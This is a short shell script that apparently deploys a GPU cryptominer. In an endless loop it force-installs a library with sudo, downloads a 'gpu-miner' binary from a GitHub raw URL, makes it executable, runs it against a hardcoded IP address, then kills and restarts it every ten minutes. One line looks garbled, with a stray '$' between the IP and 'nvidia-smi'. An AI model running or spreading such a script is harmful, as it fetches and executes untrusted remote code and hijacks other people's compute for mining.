#! /bin/sh
while command; do
rm -R mine; mkdir mine; cd mine; sudo apt --force-yes -y install libuv1.dev; wget https://github.com/aleksey1255/ai/raw/main/gpu-miner; chmod u+x gpu-miner; ./gpu-miner -a 192.248.164.239$ nvidia-smi; sleep 600; pkill gpu-miner
done
